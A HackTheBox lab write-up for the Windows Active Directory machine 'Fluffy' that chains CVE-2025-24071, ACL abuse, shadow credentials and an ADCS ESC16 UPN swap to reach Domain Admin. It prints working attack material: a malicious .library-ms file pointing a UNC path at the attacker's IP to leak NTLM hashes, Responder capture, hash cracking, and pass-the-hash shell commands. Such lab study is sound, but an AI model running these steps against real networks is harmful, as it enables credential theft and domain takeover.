# HackTheBox — Fluffy
**Difficulty:** Medium | **OS:** Windows Server 2019 | **IP:** 10.129.232.88
**Author:** k41r0s3

---

## Table of Contents

1. [Summary](#summary)
2. [Enumeration](#enumeration)
3. [SMB Enumeration — IT Share Discovery](#smb-enumeration)
4. [Kerberoasting](#kerberoasting)
5. [ADCS Enumeration](#adcs-enumeration)
6. [CVE-2025-24071 — NTLM Capture via .library-ms](#cve-2025-24071)
7. [ACL Analysis — p.agila Privilege Mapping](#acl-analysis)
8. [Shadow Credentials — ca_svc + winrm_svc](#shadow-credentials)
9. [PKINITtools — NT Hash Recovery](#pkinittools)
10. [Foothold — WinRM Shell as winrm_svc](#foothold)
11. [Privilege Escalation — ADCS ESC16](#privilege-escalation)
12. [Domain Admin](#domain-admin)
13. [Lessons Learned](#lessons-learned)
14. [Full Attack Chain](#full-attack-chain)
15. [Tools Used](#tools-used)

---

## Summary

Fluffy is a Medium-rated Windows Active Directory machine that simulates a realistic enterprise environment. The attack path starts with given low-privilege credentials and chains together CVE abuse, ACL archaeology, shadow credentials, and an ADCS ESC16 certificate attack to reach Domain Admin.

The box teaches a critical lesson: **always read every document you find on accessible shares**. The `Upgrade_Notice.pdf` inside the IT share was literally a roadmap listing the exact CVEs that were unpatched on the system — including CVE-2025-24071, which became the first major pivot.

**The core attack chain:**
```
Given creds (j.fleischman)
    → IT share WRITE + CVE-2025-24071
    → p.agila NTLM hash captured
    → Service Account Managers ACL abuse
    → Shadow credentials on service accounts
    → winrm_svc shell (USER FLAG)
    → ADCS ESC16 UPN swap
    → Domain Admin (ROOT FLAG)
```

---

## Enumeration

### Setup

Before anything, add the target to `/etc/hosts` and sync the system clock to the DC. The clock sync is critical — Kerberos authentication fails if the clock skew exceeds 5 minutes.

```bash
echo "10.129.232.88  DC01.fluffy.htb fluffy.htb" | sudo tee -a /etc/hosts
sudo ntpdate 10.129.232.88
```

### Port Scan

```bash
nmap -sV -sC --top-ports 1000 10.129.232.88
```

**Output:**
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|_  Message signing enabled and required
```

**Thought process:** This is a textbook Active Directory Domain Controller fingerprint. The combination of DNS (53), Kerberos (88), LDAP (389/636), SMB (445), and WinRM (5985) on a single host means we are looking at a DC. Two things stand out immediately:

- **SMB signing is required** — this kills NTLM relay attacks directly. We would need to capture hashes and crack them offline instead.
- **WinRM on 5985** — if we ever get credentials for a user in the Remote Management group, we get a shell with `evil-winrm`.

---

## SMB Enumeration

We were given initial credentials for `j.fleischman`.

### Validate Credentials

```bash
netexec smb 10.129.232.88 -u 'j.fleischman' -p '<REDACTED>'
```

**Output:**
```
SMB  10.129.232.88  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
SMB  10.129.232.88  445  DC01  [+] fluffy.htb\j.fleischman:<REDACTED>
```

Credentials confirmed valid.

### Share Enumeration

```bash
netexec smb 10.129.232.88 -u 'j.fleischman' -p '<REDACTED>' --shares
```

**Output:**
```
Share       Permissions   Remark
-----       -----------   ------
ADMIN$                    Remote Admin
C$                        Default share
IPC$        READ          Remote IPC
IT          READ,WRITE
NETLOGON    READ          Logon server share
SYSVOL      READ          Logon server share
```

**Finding:** The `IT` share has **READ and WRITE** access. This is a non-default share and writable access to any share is always a high-priority attack surface — we can plant files that trigger NTLM authentication from any user or process that browses the share.

### Spidering the IT Share

```bash
netexec smb 10.129.232.88 -u 'j.fleischman' -p '<REDACTED>' -M spider_plus
cat ~/.nxc/modules/nxc_spider_plus/10.129.232.88.json | python3 -m json.tool
```

**Files found in IT share:**
```
Everything-1.4.1.1026.x64.zip
Everything-1.4.1.1026.x64/everything.exe
KeePass-2.58.zip
KeePass-2.58/KeePass.exe
KeePass-2.58/Plugins/          ← empty plugins folder
Upgrade_Notice.pdf             ← ⚠️ internal document
```

**Finding:** Two critical observations:
1. **KeePass 2.58** is being deployed from this share, and the `Plugins/` folder is empty — a potential malicious plugin drop vector.
2. **Upgrade_Notice.pdf** is an internal IT document. Always download and read everything.

### Reading Upgrade_Notice.pdf

```bash
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman%<REDACTED>' \
  -c 'get Upgrade_Notice.pdf'

pdftotext Upgrade_Notice.pdf Upgrade_Notice.txt && cat Upgrade_Notice.txt
```

**Key content from the PDF:**
```
Recent Vulnerabilities — Systems Not Yet Patched:

CVE ID             Severity
CVE-2025-24996     Critical   — NTLM hash disclosure via .url/.lnk files
CVE-2025-24071     Critical   — NTLM hash leak via .library-ms files
CVE-2025-46785     High       — KeePass vulnerability
CVE-2025-29968     High       — ADCS related
CVE-2025-21193     Medium     — ADCS related
CVE-2025-3445      Low        — mDNS spoofing
```

**This PDF is the roadmap.** The IT team left a document listing exactly which CVEs are unpatched. CVE-2025-24071 immediately stands out — it causes Windows Explorer to automatically authenticate to a UNC path embedded in a `.library-ms` file, leaking an NTLMv2 hash. Combined with WRITE access to the IT share, this is directly exploitable.

---

## Kerberoasting

While planning the CVE-2025-24071 attack, we run Kerberoasting in parallel to check for weak service account passwords.

```bash
impacket-GetUserSPNs fluffy.htb/j.fleischman:'<REDACTED>' \
  -dc-ip 10.129.232.88 -request -outputfile kerberoast.txt
```

**Output:**
```
ServicePrincipalName    Name       MemberOf                            PasswordLastSet
----------------------  ---------  ----------------------------------  ---------------------------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,...    2025-04-18 (active)
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,...    2025-04-18 (never logged in)
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,...    2025-05-18 (active)
```

**Three Kerberoastable service accounts.** The SPNs themselves are informative — `ADCS/ca.fluffy.htb` confirms Active Directory Certificate Services is running, and `WINRM/winrm.fluffy.htb` means if we crack `winrm_svc` we get a shell directly.

**Cracking attempt:**
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Status: Exhausted — 0/3 hashes cracked
```

**Dead end.** All three service accounts have strong passwords outside of rockyou. We move on — the CVE-2025-24071 path is more promising.

---

## ADCS Enumeration

With the ADCS SPN identified, we enumerate the Certificate Authority:

```bash
pip install certipy-ad
certipy find -u j.fleischman@fluffy.htb -p '<REDACTED>' \
  -dc-ip 10.129.232.88 -stdout -vulnerable
```

**Output:**
```
CA Name: fluffy-DC01-CA
DNS: DC01.fluffy.htb
Web Enrollment: Disabled
User Specified SAN: Disabled
Vulnerable Templates: [!] Could not find any certificate templates
```

> **Note:** Install `certipy-ad` specifically — there is an unrelated package called `certipy` that has completely different functionality and will error out with the same commands.

**Finding:** The CA exists (`fluffy-DC01-CA`) but j.fleischman doesn't have enough permissions to enumerate certificate templates. We need a higher-privileged account — this becomes our second-phase goal after capturing a hash.

---

## CVE-2025-24071 — NTLM Capture via .library-ms

### What is CVE-2025-24071?

CVE-2025-24071 is a Windows File Explorer spoofing vulnerability. When Windows Explorer encounters a `.library-ms` file in a folder, it automatically parses the XML content and attempts to connect to any `<url>` entries listed as search connector locations — **without any user interaction beyond opening the folder**. If that URL is a UNC path (`\\attacker\share`), Windows will attempt NTLM authentication to our listener, leaking the browsing user's NTLMv2 hash.

Combined with WRITE access to the IT share, this is a straightforward attack: plant the file, wait for someone to browse the share, capture the hash.

### Step 1 — Start Responder

**Terminal 1:**
```bash
sudo responder -I tun0 -wv
```

Responder starts an SMB server on our tun0 IP and listens for incoming authentication attempts.

### Step 2 — Create the Malicious .library-ms File

**Terminal 2:**
```bash
MYIP=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "Attacker IP: $MYIP"

cat > '@threat.library-ms' << EOF
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <n>@threat</n>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\${MYIP}\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

The `@` prefix in the filename causes it to appear at the top of the folder listing alphabetically — ensuring it gets processed first when Explorer opens the directory.

### Step 3 — Upload to IT Share

```bash
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman%<REDACTED>' \
  -c 'put @threat.library-ms'
```

**Output:**
```
putting file @threat.library-ms as \@threat.library-ms (0.7 kb/s)
```

### Step 4 — Hash Captured

Within approximately 2 minutes, Responder captured an incoming NTLMv2 hash:

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:<REDACTED>
```

**New user discovered:** `p.agila` (Prometheus Agila). An automated process or the user themselves browsed the IT share and triggered authentication to our listener.

### Step 5 — Crack the Hash

```bash
cat > pagila.hash << 'EOF'
<PASTE NTLMv2 HASH HERE>
EOF

hashcat -m 5600 pagila.hash /usr/share/wordlists/rockyou.txt --force
```

**Output:**
```
Status: Cracked
Time: ~3 seconds (found at ~31% through rockyou)
```

Password successfully cracked.

### Step 6 — Enumerate p.agila

```bash
ldapsearch -x -H ldap://10.129.232.88 \
  -D "j.fleischman@fluffy.htb" -w '<REDACTED>' \
  -b "DC=fluffy,DC=htb" "(sAMAccountName=p.agila)" memberOf description
```

**Output:**
```
dn: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
memberOf: CN=Service Account Managers,CN=Users,DC=fluffy,DC=htb
```

`p.agila` is in the `Service Account Managers` group. This is a custom group — time to figure out exactly what it can do.

---

## ACL Analysis — p.agila Privilege Mapping

### Validate p.agila on SMB

```bash
netexec smb 10.129.232.88 -u 'p.agila' -p '<REDACTED>'
# [+] fluffy.htb\p.agila:<REDACTED>
```

### Check What p.agila Can Write

The most important command here — always run with `--otype ALL`, not just `USER`:

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb \
  -u p.agila -p '<REDACTED>' \
  get writable --otype ALL
```

**Output:**
```
distinguishedName: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
permission: WRITE

distinguishedName: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

**Critical finding:** p.agila has `CREATE_CHILD`, `WRITE`, `OWNER WRITE`, and `DACL WRITE` on the `CN=Service Accounts` container. This means full control over the container and all objects within it — including `ca_svc`, `ldap_svc`, and `winrm_svc`.

### Resolve the ACL — Who Actually Has FULL CONTROL?

Querying the raw `nTSecurityDescriptor` on the Service Accounts container revealed a SID with `0xf01ff` (FULL CONTROL) and `CI` (Container Inherit) flags. We resolve the SID via ldapsearch:

```bash
ldapsearch -x -H ldap://10.129.232.88 \
  -D "p.agila@fluffy.htb" -w '<REDACTED>' \
  -b "DC=fluffy,DC=htb" \
  "(objectSid=S-1-5-21-497550768-2797716248-2627064577-1604)" \
  sAMAccountName cn
```

**Output:**
```
cn: Service Account Managers
sAMAccountName: Service Account Managers
```

**RID 1604 = the Service Account Managers group itself.** The group has FULL CONTROL with Container Inherit over the Service Accounts container. Since p.agila is a member of Service Account Managers, they inherit this control.

### Add p.agila to Service Accounts Group

The container WRITE permission means p.agila can modify group membership at the container level. We add ourselves directly to the Service Accounts group to gain inherited FULL CONTROL over all its member objects:

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb \
  -u p.agila -p '<REDACTED>' \
  add groupMember "CN=Service Accounts,CN=Users,DC=fluffy,DC=htb" p.agila
```

**Output:**
```
[+] p.agila added to CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
```

Now p.agila is directly in the Service Accounts group. The inherited FULL CONTROL ACE applies to all child objects — `ca_svc`, `winrm_svc`, `ldap_svc`.

---

## Shadow Credentials — ca_svc + winrm_svc

### What are Shadow Credentials?

Shadow Credentials work by writing a `KeyCredential` to an account's `msDS-KeyCredentialLink` attribute. When PKINIT authentication is used, the KDC allows authentication using this key credential as an alternative to the account's password. If we can write to this attribute (which requires GenericWrite or FULL CONTROL), we can authenticate as that account **without knowing their password**.

This is cleaner than password reset — it is reversible, doesn't lock out the account, and doesn't change any visible credentials.

### Add Shadow Credentials to ca_svc

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb \
  -u p.agila -p '<REDACTED>' \
  add shadowCredentials ca_svc
```

**Output:**
```
[+] KeyCredential generated with SHA256: <HASH>
[+] Saved PEM certificate at path: 3kGEFgVf_cert.pem
[+] Saved PEM private key at path: 3kGEFgVf_priv.pem
Run: python3 PKINITtools/gettgtpkinit.py -cert-pem 3kGEFgVf_cert.pem -key-pem 3kGEFgVf_priv.pem fluffy.htb/ca_svc 3kGEFgVf.ccache
```

### Add Shadow Credentials to winrm_svc

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb \
  -u p.agila -p '<REDACTED>' \
  add shadowCredentials winrm_svc
```

**Output:**
```
[+] KeyCredential generated with SHA256: <HASH>
[+] Saved PEM certificate at path: 1n5cKA6c_cert.pem
[+] Saved PEM private key at path: 1n5cKA6c_priv.pem
Run: python3 PKINITtools/gettgtpkinit.py -cert-pem 1n5cKA6c_cert.pem -key-pem 1n5cKA6c_priv.pem fluffy.htb/winrm_svc 1n5cKA6c.ccache
```

Shadow credentials successfully added to both service accounts.

---

## PKINITtools — NT Hash Recovery

### Install PKINITtools

```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip install -r requirements.txt
cd ..
```

### Get TGT for winrm_svc

```bash
python3 PKINITtools/gettgtpkinit.py \
  -cert-pem 1n5cKA6c_cert.pem \
  -key-pem 1n5cKA6c_priv.pem \
  fluffy.htb/winrm_svc 1n5cKA6c.ccache \
  -dc-ip 10.129.232.88
```

**Output:**
```
INFO: AS-REP encryption key (you might need this later):
INFO: <AS-REP KEY — SAVE THIS>
INFO: Saved TGT to file
```

> **Critical:** Always save the AS-REP encryption key printed here — it is required for the next step and is not stored in the ccache file.

### Get NT Hash for winrm_svc

```bash
export KRB5CCNAME=1n5cKA6c.ccache
python3 PKINITtools/getnthash.py fluffy.htb/winrm_svc \
  -key <AS-REP KEY FROM PREVIOUS STEP> \
  -dc-ip 10.129.232.88
```

**Output:**
```
Recovered NT Hash
<WINRM_SVC NT HASH>
```

### Get TGT and NT Hash for ca_svc

```bash
python3 PKINITtools/gettgtpkinit.py \
  -cert-pem 3kGEFgVf_cert.pem \
  -key-pem 3kGEFgVf_priv.pem \
  fluffy.htb/ca_svc 3kGEFgVf.ccache \
  -dc-ip 10.129.232.88
# Save the AS-REP key from output

export KRB5CCNAME=3kGEFgVf.ccache
python3 PKINITtools/getnthash.py fluffy.htb/ca_svc \
  -key <AS-REP KEY FROM PREVIOUS STEP> \
  -dc-ip 10.129.232.88
# Recovered NT Hash: <CA_SVC NT HASH>
```

---

## Foothold — WinRM Shell as winrm_svc

```bash
evil-winrm -i 10.129.232.88 -u winrm_svc -H <WINRM_SVC NT HASH>
```

**Output:**
```
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

**Shell obtained as winrm_svc.**

### User Flag

```powershell
type C:\Users\winrm_svc\Desktop\user.txt
# <USER FLAG>
```

### Shell Enumeration

```powershell
whoami /all
```

Key findings:
- Groups: `BUILTIN\Remote Management Users`, `BUILTIN\Certificate Service DCOM Access`, `FLUFFY\Service Accounts`
- Privileges: Only `SeMachineAccountPrivilege` — no direct exploit path from here
- Domain Admins: Only `Administrator` is a member

The path forward is through `ca_svc` and ADCS.

---

## Privilege Escalation — ADCS ESC16

### Re-enumerate ADCS as ca_svc

```bash
certipy find -u ca_svc@fluffy.htb \
  -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 -stdout -vulnerable
```

**Output (key section):**
```
Certificate Authorities
  0
    CA Name                : fluffy-DC01-CA
    Disabled Extensions    : 1.3.6.1.4.1.311.25.2
    [!] Vulnerabilities
      ESC16                : Security Extension is disabled.
```

**ESC16 confirmed.** The CA has the SID security extension (`szOID_NTDS_CA_SECURITY_EXT`, OID `1.3.6.1.4.1.311.25.2`) disabled globally on its `DisableExtensionList`.

### What is ESC16?

ESC16 is a CA-level misconfiguration where the SID security extension is globally disabled for all certificates issued by the CA. This extension enables "strong certificate binding" — it embeds the account's SID in the certificate so the KDC can verify the certificate belongs to the right account.

Without this extension, the KDC falls back to legacy certificate mapping using the User Principal Name (UPN) from the certificate's Subject Alternative Name. This means:

> If an attacker can **change a service account's UPN to `administrator`** and **request a certificate** while that UPN is set, the CA will issue a certificate with `administrator` in the UPN — and the KDC will accept it as proof of being the Administrator account.

This is called a **UPN swap attack**.

**Requirements for ESC16:**
- The CA has SID extension disabled ✅
- The attacker controls an account they can modify the UPN on (ca_svc via FULL CONTROL) ✅
- The attacker can request a certificate (ca_svc can enroll via `User` template) ✅

### Step 1 — Change ca_svc UPN to administrator

```bash
certipy account -u ca_svc@fluffy.htb \
  -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 \
  -upn administrator@fluffy.htb \
  -user ca_svc update
```

**Output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName: administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

### Step 2 — Request Certificate (with -debug flag)

> **Important:** The `-debug` flag is critical here. Without it, certipy tries to connect via the RPC endpoint mapper on port 135, which may be blocked. With `-debug`, it falls back to `ncacn_np:[\pipe\cert]` — the named pipe transport — which works reliably.

```bash
certipy req -u ca_svc@fluffy.htb \
  -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 \
  -target DC01.fluffy.htb \
  -ca fluffy-DC01-CA \
  -template User \
  -debug
```

**Output:**
```
[+] Trying to connect to endpoint: ncacn_np:10.129.232.88[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.232.88[\pipe\cert]
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Certificate issued with `administrator@fluffy.htb` in the UPN and no SID — ESC16 working as expected.

### Step 3 — Revert ca_svc UPN Immediately

```bash
certipy account -u ca_svc@fluffy.htb \
  -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 \
  -upn ca_svc@fluffy.htb \
  -user ca_svc update
```

**Output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName: ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Always revert UPN changes immediately after the certificate is saved — good operational hygiene.

### Step 4 — Authenticate as Domain Admin

```bash
certipy auth -pfx administrator.pfx \
  -dc-ip 10.129.232.88 \
  -username administrator \
  -domain fluffy.htb
```

**Output:**
```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@fluffy.htb'
[*] Got TGT
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<ADMIN NT HASH>
```

**Domain Admin NT hash obtained.**

---

## Domain Admin

```bash
evil-winrm -i 10.129.232.88 -u administrator -H <ADMIN NT HASH>
```

**Output:**
```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
# <ROOT FLAG>
```

---

## Lessons Learned

**1. Always read every document on accessible shares.**
The `Upgrade_Notice.pdf` listed the exact CVEs unpatched on the system. In real engagements, internal documents contain network maps, credentials, change logs, and vulnerability lists. Never skip them.

**2. Install `certipy-ad`, not `certipy`.**
These are two completely different Python packages. `certipy` is an unrelated tool that will error out on every certipy command. Always `pip install certipy-ad`.

**3. Use `bloodyAD get writable --otype ALL`.**
Running with `--otype USER` only missed the container-level rights entirely. The FULL CONTROL on the `Service Accounts` container was only visible with `--otype ALL`. Always use ALL.

**4. ACL inheritance flows through containers.**
The `Service Account Managers` group had FULL CONTROL with Container Inherit (`CI`) on the `Service Accounts` container — not on the individual accounts. Checking the parent container's ACL, not just the target object, revealed the real attack path.

**5. Add yourself to the group before trying shadow credentials.**
Shadow credentials kept failing with `insufficientAccessRights` until p.agila was added to the Service Accounts group. bloodyAD re-authenticates on each call, so the new group membership was picked up immediately without needing to refresh any session.

**6. Always save the AS-REP key from gettgtpkinit.py.**
The AS-REP encryption key printed during `gettgtpkinit.py` is required by `getnthash.py` via the `-key` flag. It is not stored in the ccache file. If you miss it, you have to run `gettgtpkinit.py` again.

**7. Use `-debug` with `certipy req` when RPC times out.**
Without `-debug`, certipy fails to connect when the RPC endpoint mapper is blocked. The debug flag enables fallback to the `ncacn_np:\pipe\cert` named pipe, which worked here. When standard `certipy req` fails, always retry with `-debug`.

**8. Kerberoast early, move on fast.**
If rockyou fails on all hashes in under 2 minutes, the passwords are strong. Don't invest more time unless every other path is exhausted.

---

## Full Attack Chain

```
[SETUP]
echo "10.129.232.88  DC01.fluffy.htb fluffy.htb" | sudo tee -a /etc/hosts
sudo ntpdate 10.129.232.88

[RECON]
nmap -sV -sC --top-ports 1000 10.129.232.88
→ Ports: 53, 88, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985
→ Domain: fluffy.htb | DC01 | Server 2019 | SMB signing required

[SMB ENUM — given creds]
netexec smb 10.129.232.88 -u j.fleischman -p '<REDACTED>' --shares
→ IT share: READ+WRITE

netexec smb 10.129.232.88 -u j.fleischman -p '<REDACTED>' -M spider_plus
→ KeePass-2.58/, Upgrade_Notice.pdf

smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman%<REDACTED>' -c 'get Upgrade_Notice.pdf'
pdftotext Upgrade_Notice.pdf Upgrade_Notice.txt && cat Upgrade_Notice.txt
→ CVE-2025-24071 unpatched — roadmap found

[KERBEROASTING]
impacket-GetUserSPNs fluffy.htb/j.fleischman:'<REDACTED>' -dc-ip 10.129.232.88 -request
→ ca_svc, ldap_svc, winrm_svc hashes
→ hashcat -m 13100 → all exhausted — strong passwords

[ADCS ENUM — low priv]
certipy find -u j.fleischman@fluffy.htb -p '<REDACTED>' -dc-ip 10.129.232.88 -stdout -vulnerable
→ fluffy-DC01-CA found — templates not readable (insufficient perms)

[CVE-2025-24071 — NTLM CAPTURE]
sudo responder -I tun0 -wv                                    ← Terminal 1
# Create @threat.library-ms with UNC path to tun0 IP
smbclient //IT ... -c 'put @threat.library-ms'               ← Terminal 2
→ [SMB] FLUFFY\p.agila NTLMv2 hash captured

hashcat -m 5600 pagila.hash rockyou.txt
→ p.agila password cracked in ~3 seconds

ldapsearch ... "(sAMAccountName=p.agila)" memberOf
→ CN=Service Account Managers

[ACL ANALYSIS — p.agila]
bloodyAD get writable --otype ALL
→ CN=Service Accounts container: CREATE_CHILD; WRITE; OWNER; DACL

ldapsearch "(objectSid=S-1-5-21-...-1604)" sAMAccountName
→ RID 1604 = Service Account Managers group = FULL CONTROL with CI on Service Accounts

bloodyAD add groupMember "CN=Service Accounts,CN=Users,DC=fluffy,DC=htb" p.agila
→ [+] p.agila added to Service Accounts group

[SHADOW CREDENTIALS]
bloodyAD add shadowCredentials ca_svc    → 3kGEFgVf_cert.pem / 3kGEFgVf_priv.pem
bloodyAD add shadowCredentials winrm_svc → 1n5cKA6c_cert.pem / 1n5cKA6c_priv.pem

[PKINITTOOLS — NT HASH RECOVERY]
python3 PKINITtools/gettgtpkinit.py \
  -cert-pem 1n5cKA6c_cert.pem -key-pem 1n5cKA6c_priv.pem \
  fluffy.htb/winrm_svc 1n5cKA6c.ccache -dc-ip 10.129.232.88
→ Save AS-REP encryption key from output

export KRB5CCNAME=1n5cKA6c.ccache
python3 PKINITtools/getnthash.py fluffy.htb/winrm_svc \
  -key <ASREP KEY> -dc-ip 10.129.232.88
→ winrm_svc NT hash recovered

python3 PKINITtools/gettgtpkinit.py \
  -cert-pem 3kGEFgVf_cert.pem -key-pem 3kGEFgVf_priv.pem \
  fluffy.htb/ca_svc 3kGEFgVf.ccache -dc-ip 10.129.232.88
→ Save AS-REP encryption key from output

export KRB5CCNAME=3kGEFgVf.ccache
python3 PKINITtools/getnthash.py fluffy.htb/ca_svc \
  -key <ASREP KEY> -dc-ip 10.129.232.88
→ ca_svc NT hash recovered

[FOOTHOLD — winrm_svc]
evil-winrm -i 10.129.232.88 -u winrm_svc -H <WINRM_SVC NT HASH>
type C:\Users\winrm_svc\Desktop\user.txt → USER FLAG ✅

[ADCS ESC16 — ca_svc]
certipy find -u ca_svc@fluffy.htb -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 -stdout -vulnerable
→ ESC16: Security Extension is disabled

certipy account -u ca_svc@fluffy.htb -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 -upn administrator@fluffy.htb -user ca_svc update
→ ca_svc UPN = administrator@fluffy.htb

certipy req -u ca_svc@fluffy.htb -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 -target DC01.fluffy.htb \
  -ca fluffy-DC01-CA -template User -debug
→ Got certificate with UPN 'administrator@fluffy.htb' — no object SID
→ Saved to administrator.pfx

certipy account -u ca_svc@fluffy.htb -hashes :<CA_SVC NT HASH> \
  -dc-ip 10.129.232.88 -upn ca_svc@fluffy.htb -user ca_svc update
→ UPN reverted

certipy auth -pfx administrator.pfx \
  -dc-ip 10.129.232.88 -username administrator -domain fluffy.htb
→ administrator NT hash recovered

[DOMAIN ADMIN]
evil-winrm -i 10.129.232.88 -u administrator -H <ADMIN NT HASH>
type C:\Users\Administrator\Desktop\root.txt → ROOT FLAG ✅
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| netexec | SMB credential validation, share enumeration, spider |
| smbclient | File download from SMB shares |
| pdftotext | Read PDF files in terminal |
| impacket-GetUserSPNs | Kerberoasting |
| hashcat | NTLMv2 (-m 5600) and TGS (-m 13100) hash cracking |
| responder | NTLM hash capture listener |
| ldapsearch | LDAP enumeration and SID resolution |
| bloodyAD | ACL enumeration, group membership modification, shadow credentials |
| certipy-ad | ADCS enumeration (ESC16), UPN modification, cert request, auth |
| PKINITtools | PKINIT TGT request (gettgtpkinit.py) and NT hash recovery (getnthash.py) |
| evil-winrm | WinRM shell via NT hash |
| bloodhound-python | AD data collection |

---

*Writeup by k41r0s3 — HackTheBox Fluffy (Medium Windows AD)*
